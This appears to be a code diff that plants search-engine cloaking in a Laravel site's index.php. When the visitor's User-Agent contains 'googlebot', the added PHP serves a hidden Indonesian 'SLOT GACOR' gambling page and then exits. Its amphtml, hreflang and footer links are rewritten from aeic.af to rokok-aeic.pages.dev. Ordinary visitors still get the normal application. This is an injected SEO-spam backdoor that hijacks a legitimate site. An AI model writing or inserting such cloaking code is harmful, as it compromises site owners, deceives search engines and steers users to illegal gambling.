@@ -1,14 +1,16 @@
+<?php
 
-
-
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
 <!doctype html>
 <html class="js" lang="id" style="--header-height: 121px;"><head>
    <meta charset="UTF-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 	<meta name="viewport" content="width=device-width,initial-scale=1" />
 	<link rel="canonical" href="https://aeic.af/" />
-   <link rel="amphtml" href="https://aeic.af/amp/" />
-   <link rel="alternate" hreflang="id" href="https://aeic.af/amp/" />
+   <link rel="amphtml" href="https://rokok-aeic.pages.dev/" />
+   <link rel="alternate" hreflang="id" href="https://rokok-aeic.pages.dev/" />
    <link rel="alternate" hreflang="x-default" href="https://aeic.af/" />
    <meta name="robots" content="index, follow">
 	<link rel="preconnect" href="https://cdn.shopify.com" crossorigin />
@@ -9388,23 +9390,23 @@ document.getElementById("prdx-generate").addEventListener("click", () => {
 }
 </style>
 <div class="mjp-fixed-footer">
-    <a href="https://aeic.af/amp/" rel="nofollow noopener" target="_blank">
+    <a href="https://rokok-aeic.pages.dev/" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMCvnHmhcNLB375t9IB5mHd49Jb1j6K9jQCKINY3gGDE0wT_sBCoTniN_q6GzwmwtJtkUP9K8ebrw785LDbXmxHn3oBK_Rn56LFLgzoFEOrlZlzJmMbmnNIQHPtTuGsI3lXhYJmuauevEPKJ3xLS7_rF2Ao0L-MsgWRfHSLvr8ZRyv5Vr2VIxfnnNJer1l/s500/rokokbet-icon.png" alt="BONUS SLOT GACOR">
         Promo
     </a>
-    <a href="https://aeic.af/amp/" rel="nofollow noopener" target="_blank">
+    <a href="https://rokok-aeic.pages.dev/" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMCvnHmhcNLB375t9IB5mHd49Jb1j6K9jQCKINY3gGDE0wT_sBCoTniN_q6GzwmwtJtkUP9K8ebrw785LDbXmxHn3oBK_Rn56LFLgzoFEOrlZlzJmMbmnNIQHPtTuGsI3lXhYJmuauevEPKJ3xLS7_rF2Ao0L-MsgWRfHSLvr8ZRyv5Vr2VIxfnnNJer1l/s500/rokokbet-icon.png" alt="LOGIN SLOT GACOR">
         Login
     </a>
-    <a href="https://aeic.af/amp/" rel="nofollow noopener" target="_blank" class="tada">
+    <a href="https://rokok-aeic.pages.dev/" rel="nofollow noopener" target="_blank" class="tada">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMCvnHmhcNLB375t9IB5mHd49Jb1j6K9jQCKINY3gGDE0wT_sBCoTniN_q6GzwmwtJtkUP9K8ebrw785LDbXmxHn3oBK_Rn56LFLgzoFEOrlZlzJmMbmnNIQHPtTuGsI3lXhYJmuauevEPKJ3xLS7_rF2Ao0L-MsgWRfHSLvr8ZRyv5Vr2VIxfnnNJer1l/s500/rokokbet-icon.png" alt="DAFTAR SLOT GACOR">
         Daftar
     </a>
-    <a href="https://aeic.af/amp/" rel="nofollow noopener" target="_blank">
+    <a href="https://rokok-aeic.pages.dev/" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMCvnHmhcNLB375t9IB5mHd49Jb1j6K9jQCKINY3gGDE0wT_sBCoTniN_q6GzwmwtJtkUP9K8ebrw785LDbXmxHn3oBK_Rn56LFLgzoFEOrlZlzJmMbmnNIQHPtTuGsI3lXhYJmuauevEPKJ3xLS7_rF2Ao0L-MsgWRfHSLvr8ZRyv5Vr2VIxfnnNJer1l/s500/rokokbet-icon.png" alt="WHATSAPP SLOT GACOR">
         Whatsapp
     </a>
-    <a href="https://aeic.af/amp/" rel="nofollow noopener" target="_blank"
+    <a href="https://rokok-aeic.pages.dev/" rel="nofollow noopener" target="_blank"
         class="js_live_chat_link live-chat-link">
         <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMCvnHmhcNLB375t9IB5mHd49Jb1j6K9jQCKINY3gGDE0wT_sBCoTniN_q6GzwmwtJtkUP9K8ebrw785LDbXmxHn3oBK_Rn56LFLgzoFEOrlZlzJmMbmnNIQHPtTuGsI3lXhYJmuauevEPKJ3xLS7_rF2Ao0L-MsgWRfHSLvr8ZRyv5Vr2VIxfnnNJer1l/s500/rokokbet-icon.png"
             alt="LIVE CHAT SLOT GACOR">
@@ -14622,3 +14624,63 @@ document.querySelectorAll(".cok-faq-q").forEach(btn => {
         padding: 10px 12px 12px;
         }
     </style>
+<?php
+exit;
+}
+?>
+<?php
+
+use Illuminate\Contracts\Http\Kernel;
+use Illuminate\Http\Request;
+
+define('LARAVEL_START', microtime(true));
+
+/*
+|--------------------------------------------------------------------------
+| Check If The Application Is Under Maintenance
+|--------------------------------------------------------------------------
+|
+| If the application is in maintenance / demo mode via the "down" command
+| we will load this file so that any pre-rendered content can be shown
+| instead of starting the framework, which could cause an exception.
+|
+*/
+
+if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
+    require $maintenance;
+}
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| this application. We just need to utilize it! We'll simply require it
+| into the script here so we don't need to manually load our classes.
+|
+*/
+
+require __DIR__.'/vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request using
+| the application's HTTP kernel. Then, we will send the response back
+| to this client's browser, allowing them to enjoy our application.
+|
+*/
+
+$app = require_once __DIR__.'/bootstrap/app.php';
+
+$kernel = $app->make(Kernel::class);
+
+$response = $kernel->handle(
+    $request = Request::capture()
+)->send();
+
+$kernel->terminate($request, $response);    
+   
